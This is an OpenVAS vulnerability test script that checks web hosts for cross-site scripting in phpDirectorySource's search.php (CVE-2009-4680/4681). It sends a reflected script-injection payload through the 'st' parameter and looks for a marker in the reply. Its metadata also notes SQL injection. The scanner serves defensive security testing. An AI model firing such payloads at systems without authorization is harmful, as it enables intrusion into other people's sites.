##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_php_directory_source_mult_vuln.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# phpDirectorySource Multiple Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.800738");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-03-18 15:44:57 +0100 (Thu, 18 Mar 2010)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_bugtraq_id(35760);
  script_cve_id("CVE-2009-4680", "CVE-2009-4681");
  script_name("phpDirectorySource Multiple Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/35941");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9226");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Input passed to 'search.php' through 'st' parameter is not properly
  sanitised before being returned to the user and before being used in SQL queries.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running phpDirectorySource and is prone to multiple
  vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary HTML or
  execute arbitrary SQL commands in the context of an affected site.");
  script_tag(name:"affected", value:"phpDirectorySource version 1.x");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

phpPort = get_http_port(default:80);

if(!can_host_php(port:phpPort)){
  exit(0);
}

foreach dir (make_list_unique("/pds", "/" , cgi_dirs(port:phpPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:phpPort);

  if("phpDirectorySource" >< rcvRes)
  {
    sndReq = http_get(item:string(dir, '/search.php?sa=site&sk=a&nl=11&st=">'+
            '<script>alert("OpenVASExploitTesting");</script>'), port:phpPort);
    rcvRes = http_keepalive_send_recv(port:phpPort, data:sndReq);
    if((rcvRes =~ "HTTP/1\.. 200" && "OpenVASExploitTesting" >< rcvRes))
    {
      security_message(port:phpPort);
      exit(0);
    }
  }
}

exit(99);
